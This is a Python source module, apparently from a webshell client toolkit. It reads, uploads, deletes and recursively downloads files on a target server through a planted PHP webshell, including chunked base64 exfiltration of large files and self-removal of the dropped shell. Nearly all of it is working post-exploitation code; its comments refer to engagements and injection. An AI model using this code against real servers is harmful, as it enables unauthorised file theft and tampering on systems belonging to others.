"""File operations: read, existence checks and downloads (with skip-if-unchanged)."""

from __future__ import annotations

import base64
import shlex
from pathlib import Path

from .. import log
from ..core.php import php_string
from ..core.webshell import WebShell
from ..exceptions import WebshellError
from ..utils.hashing import hash_file
from ..utils.http import get_domain


def read_file(ws: WebShell, path: str) -> str:
    log.info(f"Reading file: {path}")
    content = ws.run_php(f"echo file_get_contents({php_string(path)})")
    log.raw(content)
    return content


def file_exists(ws: WebShell, path: str) -> bool:
    result = ws.run_php(f"var_dump(file_exists({php_string(path)}))")
    return "bool(true)" in result


def is_directory(ws: WebShell, path: str) -> bool:
    result = ws.run_php(f"var_dump(is_dir({php_string(path)}))")
    return "bool(true)" in result


def hash_remote_file(ws: WebShell, path: str) -> str:
    return ws.run_php(f"echo md5(file_get_contents({php_string(path)}))").strip()


def upload(ws: WebShell, local_path: str | Path, remote_path: str) -> bool:
    """Upload a local file to ``remote_path`` on the target.

    Fills a real gap — v1 shipped an empty ``upload_file.py`` stub. The bytes
    are base64-encoded, so any binary content transfers intact.
    """
    data = Path(local_path).read_bytes()
    encoded = base64.b64encode(data).decode()
    code = (
        f"echo file_put_contents({php_string(remote_path)}, base64_decode('{encoded}')) "
        "!== false ? 'OK' : 'FAIL'"
    )
    ok = "OK" in ws.run_php(code)
    if ok:
        log.success(f"Uploaded {local_path} -> {remote_path} ({len(data)} bytes)")
    else:
        log.error(f"Upload failed: {remote_path}")
    return ok


def remove(ws: WebShell, path: str | None = None) -> bool:
    """Delete a remote file. With no ``path`` the webshell deletes *itself*.

    Self-removal (``unlink(__FILE__)``) is the engagement-cleanup counterpart to
    injection — it lets you pull a dropped shell once you are done with it.
    """
    target = php_string(path) if path else "__FILE__"
    ok = "bool(true)" in ws.run_php(f"var_dump(unlink({target}))")
    if ok:
        log.success(f"Removed {path or 'the webshell itself (__FILE__)'}")
    else:
        log.error(f"Failed to remove {path or '__FILE__'}")
    return ok


def list_directories(ws: WebShell, path: str) -> list[str]:
    output = ws.run_command(f"find {shlex.quote(path)} -type d")
    return [line for line in output.splitlines() if line and not line.startswith("find:")]


def _local_path(ws: WebShell, remote_path: str, output_dir: Path) -> Path:
    """Mirror ``remote_path`` under ``output_dir/<domain>/``.

    The remote path comes from the *target's* ``find`` output, so a malicious or
    honeypot server could embed ``..`` to write outside the output directory on
    the operator's machine. Any such attempt is flattened to the basename.
    """
    base = (output_dir / get_domain(ws.url)).resolve()
    candidate = (base / remote_path.lstrip("/")).resolve()
    if not candidate.is_relative_to(base):
        log.warning(f"Path traversal blocked; flattening: {remote_path}")
        candidate = base / Path(remote_path).name
    return candidate


DEFAULT_CHUNK = 512 * 1024


def _remote_size(ws: WebShell, path: str) -> int:
    try:
        return int(ws.run_php(f"echo filesize({php_string(path)})").strip())
    except (ValueError, WebshellError):
        return -1


def _fetch(ws: WebShell, remote_path: str, chunk_size: int) -> bytes:
    """Fetch a remote file, reading it in ranges when it's larger than a chunk.

    Avoids base64-encoding a huge file into a single response (which blows PHP's
    ``memory_limit`` / POST limits and buffers everything in memory).
    """
    size = _remote_size(ws, remote_path)
    if size <= 0 or size <= chunk_size:
        return base64.b64decode(
            ws.run_php(f"echo base64_encode(file_get_contents({php_string(remote_path)}))")
        )
    parts: list[bytes] = []
    for offset in log.track(list(range(0, size, chunk_size)), f"↓ {Path(remote_path).name}"):
        code = (
            f"$f=fopen({php_string(remote_path)},'rb');fseek($f,{offset});"
            f"echo base64_encode(fread($f,{chunk_size}));fclose($f)"
        )
        parts.append(base64.b64decode(ws.run_php(code)))
    return b"".join(parts)


def _download_one(
    ws: WebShell, remote_path: str, local_path: Path, chunk_size: int = DEFAULT_CHUNK
) -> bool:
    """Download a single file, skipping it if an identical copy already exists."""
    if local_path.exists():
        if hash_remote_file(ws, remote_path) == hash_file(local_path):
            log.warning(f"Unchanged, skipping: {remote_path}")
            return True
        log.info(f"Remote changed, re-downloading: {remote_path}")
    try:
        data = _fetch(ws, remote_path, chunk_size)
    except (ValueError, TypeError) as exc:
        log.error(f"Failed to decode {remote_path}: {exc}")
        return False
    local_path.parent.mkdir(parents=True, exist_ok=True)
    local_path.write_bytes(data)
    log.success(f"Saved {remote_path} -> {local_path} ({len(data)} bytes)")
    return True


def download(
    ws: WebShell, remote_path: str, output_dir: Path, chunk_size: int = DEFAULT_CHUNK
) -> None:
    """Download a single remote file (ranged for large files)."""
    _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir), chunk_size)


def download_tree(
    ws: WebShell, path: str, name_filter: str = "*", find_args: str | None = None,
    *, output_dir: Path, chunk_size: int = DEFAULT_CHUNK,
) -> None:
    """Recursively download files under ``path``.

    ``name_filter`` maps to ``find -name``; pass ``find_args`` for full control
    (the v1 "download advanced" mode, e.g. ``-size -500k``).
    """
    if find_args:
        cmd = f"find {shlex.quote(path)} {find_args}"
    else:
        cmd = f"find {shlex.quote(path)} -type f -name {shlex.quote(name_filter)}"
    try:
        listing = ws.run_command(cmd)
    except WebshellError as exc:
        log.error(f"Listing failed: {exc}")
        return
    targets = [line for line in listing.splitlines() if line and not line.startswith("find:")]
    log.info(f"{len(targets)} file(s) to download.")
    for remote_path in log.track(targets, "Downloading"):
        _download_one(ws, remote_path, _local_path(ws, remote_path, output_dir), chunk_size)
